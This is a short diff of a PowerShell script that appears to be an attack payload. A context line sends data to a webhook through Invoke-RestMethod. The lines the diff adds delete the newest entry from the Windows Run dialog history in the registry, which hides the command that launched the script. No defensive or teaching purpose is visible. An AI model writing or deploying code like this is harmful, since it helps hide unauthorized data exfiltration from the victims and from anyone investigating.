@@ -34,5 +34,13 @@ Invoke-RestMethod -Uri $WEBHOOK `
     
 }
 
+$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+
+$reg = Get-ItemProperty -Path $path
+$lastKey = $reg.MRUList.Substring(0,1)
+
+Remove-ItemProperty -Path $path -Name $lastKey -ErrorAction SilentlyContinue
+
+
 
 
